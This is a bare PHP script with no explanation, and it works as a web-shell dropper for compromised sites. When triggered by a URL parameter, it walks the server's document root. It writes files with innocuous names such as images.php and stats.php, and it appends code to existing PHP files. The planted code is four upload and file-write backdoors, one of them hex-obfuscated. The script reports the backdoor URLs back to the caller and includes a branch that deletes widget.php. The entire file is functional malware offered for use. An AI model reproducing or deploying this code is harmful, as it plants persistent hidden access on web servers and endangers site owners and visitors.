<?php

error_reporting(0);
@set_time_limit(180);

if($_GET['connect']){
	echo 'ok';
}

function DirReFind($addres, &$GlobDirpe){
    static $CountS = 0;
    if($dirhen = @opendir($addres)){
        while ($file = @readdir($dirhen))
            if(!in_array($file, array('.', '..')) && @is_dir($permdir = "$addres/$file")){
                @is_writable($permdir) && ($CountS < ($count = substr_count($permdir, '/'))) && ($CountS = $count) && ($GlobDirpe = $permdir.'/');
                @is_writable($permdir) && ($CountS == substr_count($permdir, '/')) && (rand(0,1) == 1) && ($GlobDirpe = $permdir.'/');
                DirReFind($permdir, $GlobDirpe);
            }
        @closedir($dirhen);
    }else{
		return false;
	}
}
function writeStr($name = 'images.php', $type = '', $str){
	$root = $_SERVER['REAL_DOCUMENT_ROOT'];
	if($root == '')	$root = $_SERVER['SUBDOMAIN_DOCUMENT_ROOT'];
	if($root == '')	$root = $_SERVER['DOCUMENT_ROOT'];
	if($root == '/') $root = '';
	$root = str_replace('//', '', $root.'/');

	if($_SERVER['SCRIPT_NAME'])			$root = str_replace($_SERVER['SCRIPT_NAME'], '', __FILE__);
	
	$host = $_SERVER['HTTP_HOST'];
	$dtmp = array_diff(scandir($root.'/'), array(".", ".."));
	$dlst = array();
	foreach($dtmp as $d)
		if(is_dir($root.'/'.$d) && $d != 'webalizer' && $d != 'test') $dlst[] = $d;
	if($type == 'last')	$dlst = array_reverse($dlst);
	if($type == 'rand')	shuffle($dlst);
	foreach($dlst as $dir)
	{
		$dtmp = array_diff(scandir($root.'/'.$dir.'/'), array(".", ".."));
		shuffle($dtmp);
		foreach($dtmp as $d)
			if(is_dir($root.'/'.$dir.'/'.$d))
			{
				file_put_contents($root.'/'.$dir.'/'.$d.'/'.$name, $str);
				$link = 'http://'.$host.'/'.$dir.'/'.$d.'/'.$name;
				return $link;
			}
	}
	file_put_contents($root.'/'.$dlst[0].'/'.$name, $str);
	$link = 'http://'.$host.'/'.$dlst[0].'/'.$name;
	return $link;
}
function writeStrDip($name = 'images.php', $type = '', $str){
	$root = $_SERVER['REAL_DOCUMENT_ROOT'];
	if($root == '')	$root = $_SERVER['SUBDOMAIN_DOCUMENT_ROOT'];
	if($root == '')	$root = $_SERVER['DOCUMENT_ROOT'];
	if($root == '/') $root = '';
	$root = str_replace('//', '', $root.'/');
	if($_SERVER['SCRIPT_NAME'])			$root = str_replace($_SERVER['SCRIPT_NAME'], '', __FILE__);
	DirReFind($root, $dorsDir);

	$host = $_SERVER['HTTP_HOST'];
	file_put_contents($dorsDir.$name, $str);
	$link = 'http://'.$host.str_replace($root, '', $dorsDir).$name;
	return $link;
}	
function addStr($str){
	$root = $_SERVER['REAL_DOCUMENT_ROOT'];
	if($root == '')	$root = $_SERVER['SUBDOMAIN_DOCUMENT_ROOT'];
	if($root == '')	$root = $_SERVER['DOCUMENT_ROOT'];
	if($root == '/') $root = '';
	$root = str_replace('//', '', $root.'/');
	if($_SERVER['SCRIPT_NAME'])			$root = str_replace($_SERVER['SCRIPT_NAME'], '', __FILE__);
	
	$host = $_SERVER['HTTP_HOST'];
	$dtmp = array_diff(scandir($root.'/'), array(".", ".."));
	$dlst = array();
	foreach($dtmp as $d) if(is_dir($root.'/'.$d) && $d != 'webalizer' && $d != 'test') $dlst[] = $d;
	shuffle($dlst);
	foreach($dlst as $dir)
	{
		$dtmp = array_diff(scandir($root.'/'.$dir.'/'), array(".", ".."));
		shuffle($dtmp);
		foreach($dtmp as $d)
			if(is_dir($root.'/'.$dir.'/'.$d))
			{
				$files = array_diff(scandir($root.'/'.$dir.'/'.$d), array(".", ".."));
				foreach($files as $file)
					if(!is_dir($root.'/'.$dir.'/'.$d.'/'.$file))
						if(strpos($file, '.php') && $file != 'editer.php' && $file != 'widget.php')
						{
							$text = file_get_contents($root.'/'.$dir.'/'.$d.'/'.$file);
							$fp = fopen($root.'/'.$dir.'/'.$d.'/'.$file, "a+");
							if(substr_count($text, '<?') == substr_count($text, '?>'))
								fwrite($fp, $str);
							else
								fwrite($fp, '?>'.$str);
							fclose($fp);
							$link = 'http://'.$host.'/'.$dir.'/'.$d.'/'.$file;
							return $link;
						}
			}
	}
}
function writeStr_win($name = 'images.php', $type = '', $str){
	$SCRIPT_FILENAME = str_replace('\\', '/', $_SERVER['SCRIPT_FILENAME']);
	$SCRIPT_NAME = $_SERVER['SCRIPT_NAME'];
	$root = str_replace($SCRIPT_NAME, '', $SCRIPT_FILENAME);
	$host = $_SERVER['HTTP_HOST'];
	$dtmp = array_diff(scandir($root.'/'), array(".", ".."));
	$dlst = array();
	foreach($dtmp as $d)
		if(is_dir($root.'/'.$d) && $d != 'webalizer' && $d != 'test') $dlst[] = $d;
	if($type == 'last')	$dlst = array_reverse($dlst);
	if($type == 'rand')	shuffle($dlst);
	foreach($dlst as $dir)
	{
		$dtmp = array_diff(scandir($root.'/'.$dir.'/'), array(".", ".."));
		shuffle($dtmp);
		foreach($dtmp as $d)
			if(is_dir($root.'/'.$dir.'/'.$d))
			{
				file_put_contents($root.'/'.$dir.'/'.$d.'/'.$name, $str);
				$link = 'http://'.$host.'/'.$dir.'/'.$d.'/'.$name;
				return $link;
			}
	}
	file_put_contents($root.'/'.$dlst[0].'/'.$name, $str);
	$link = 'http://'.$host.'/'.$dlst[0].'/'.$name;
	return $link;
}
function addStr_win($str){
	$SCRIPT_FILENAME = str_replace('\\', '/', $_SERVER['SCRIPT_FILENAME']);
	$SCRIPT_NAME = $_SERVER['SCRIPT_NAME'];
	$root = str_replace($SCRIPT_NAME, '', $SCRIPT_FILENAME);
	$host = $_SERVER['HTTP_HOST'];
	$dtmp = array_diff(scandir($root.'/'), array(".", ".."));
	$dlst = array();
	foreach($dtmp as $d) if(is_dir($root.'/'.$d) && $d != 'webalizer' && $d != 'test') $dlst[] = $d;
	shuffle($dlst);
	foreach($dlst as $dir)
	{
		$dtmp = array_diff(scandir($root.'/'.$dir.'/'), array(".", ".."));
		shuffle($dtmp);
		foreach($dtmp as $d)
			if(is_dir($root.'/'.$dir.'/'.$d))
			{
				$files = array_diff(scandir($root.'/'.$dir.'/'.$d), array(".", ".."));
				foreach($files as $file)
					if(!is_dir($root.'/'.$dir.'/'.$d.'/'.$file))
						if(strpos($file, '.php') && $file != 'editer.php' && $file != 'widget.php')
						{
							$text = file_get_contents($root.'/'.$dir.'/'.$d.'/'.$file);
							$fp = fopen($root.'/'.$dir.'/'.$d.'/'.$file, "a+");
							if(substr_count($text, '<?') == substr_count($text, '?>'))
								fwrite($fp, $str);
							else
								fwrite($fp, '?>'.$str);
							fclose($fp);
							$link = 'http://'.$host.'/'.$dir.'/'.$d.'/'.$file;
							return $link;
						}
			}
	}
}

if($_GET['put'] == 1){
	$str1 = '<?php if(@$_GET[\'l\']){@move_uploaded_file($_FILES[\'f\'][\'tmp_name\'],$_FILES[\'f\'][\'name\']);};if($_POST[\'l\']){file_put_contents(\'editor.php\', $_POST[\'l\']);};if($_GET[\'s7\'])echo\'<form action="?l=1" method="post" enctype="multipart/form-data"><input name="f" type="file"><input type="submit" value="."></form><form action="" method="post"><textarea name="l"></textarea><input type="submit" name="" value="." ></form>\'; ?>';
	$str2 = '<?php if(@$_GET["\x6c"]){@move_uploaded_file($_FILES["\x66"]["\x74mp\x5f\x6e\x61m\x65"],$_FILES["\x66"]["\x6e\x61me"]);}if($_POST["l"]){file_put_contents("e\x64i\x74or\x2ep\x68p",$_POST["\x6c"]);}if($_GET["s7"])echo"<fo\x72m act\x69o\x6e=\"?\x6c=\x31\x22\x20\x6deth\x6fd=\"po\x73\x74\x22\x20\x65n\x63\x74yp\x65\x3d\x22m\x75lt\x69\x70\x61\x72\x74/\x66\x6f\x72m-\x64\x61\x74a\"\x3e\x3cinput \x6e\x61\x6de\x3d\"f\x22\x20t\x79\x70e\x3d\"\x66il\x65\"><\x69np\x75t typ\x65\x3d\"\x73ubmit\x22 \x76\x61l\x75\x65=\".\x22></\x66\x6frm><\x66\x6fr\x6d \x61ct\x69\x6f\x6e\x3d\x22\x22\x20\x6de\x74h\x6f\x64\x3d\x22\x70ost\"\x3e\x3ct\x65x\x74are\x61\x20\x6e\x61\x6de\x3d\"\x6c\x22\x3e</t\x65\x78t\x61\x72ea\x3e\x3c\x69\x6ep\x75\x74 \x74y\x70e=\x22s\x75\x62mit\" \x6eame=\x22\x22\x20value=\x22.\x22 ></f\x6frm>"; ?>';
	$str3 = '<?php if(@$_GET[\'hxc\'] == \'upl\') {echo "<form method=\'post\' enctype=\'multipart/form-data\'><input type=\'file\' name=\'files\'><input type=\'submit\' value=\'upload\'></form>";$tmp = $_FILES[\'files\'][\'tmp_name\'];$name = $_FILES[\'files\'][\'name\'];$move = move_uploaded_file($tmp, $name);if($move) {echo "<br><b>Success";} else {echo "<br><b>hxc cr3w!";}} ?>';
	$str4 = '<form action=\'\' method=\'post\' enctype=\'multipart/form-data\' name=\'uploader\' id=\'uploader\'><input type=\'file\' name=\'file\' size=\'50\'><input name=\'_upl\' type=\'submit\' id=\'_upl\' value=\'Upload\'></form><?php if( $_POST[\'_upl\'] == \'Upload\' ) {if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Ok Done<b><br><br>\'; }else { echo \'<b>Ali Afee Was Here ok Done Skype mr_afee</b><br><br>\'; }} if(!empty($_FILES[\'uploaded_file\'])){$path = \'../../\';$path = $path . basename( $_FILES[\'uploaded_file\'][\'name\']);if(move_uploaded_file($_FILES[\'uploaded_file\'][\'tmp_name\'], $path)) {echo \'The file \'.  basename( $_FILES[\'uploaded_file\'][\'name\']). \' has been uploaded\';} else{echo \'There was an error uploading the file, please try again!\';}}?>';

	if($_SERVER['OS'] == 'Windows_NT'){
		echo addStr_win($str1).'?s7=1|';
		echo addStr_win($str2).'?s7=1|';
		echo addStr_win($str3).'?hxc=upl|';
		echo writeStr_win('images.php', 'last', $str1).'?s7=1|';
		echo writeStr_win('stats.php', 'rand', $str2).'?s7=1';
		echo writeStr_win('logs.php', 'rand', $str3).'?hxc=upl|';
		echo writeStr_win('core.php', 'last', $str4);
	}else{
		echo addStr($str1).'?s7=1|';
		echo addStr($str2).'?s7=1|';
		echo addStr($str3).'?hxc=upl|';
		echo writeStr('images.php', 'last', $str1).'?s7=1|';
		echo writeStr('stats.php', 'rand', $str2).'?s7=1|';	
		echo writeStr('logs.php', 'rand', $str3).'?hxc=upl|';
		echo writeStr('core.php', 'last', $str4);
		echo writeStrDip('index-2.php', 'last', $str2).'?s7=1';
	}
}

if($_GET['del'] == 1){
	unlink('widget.php');
}

?>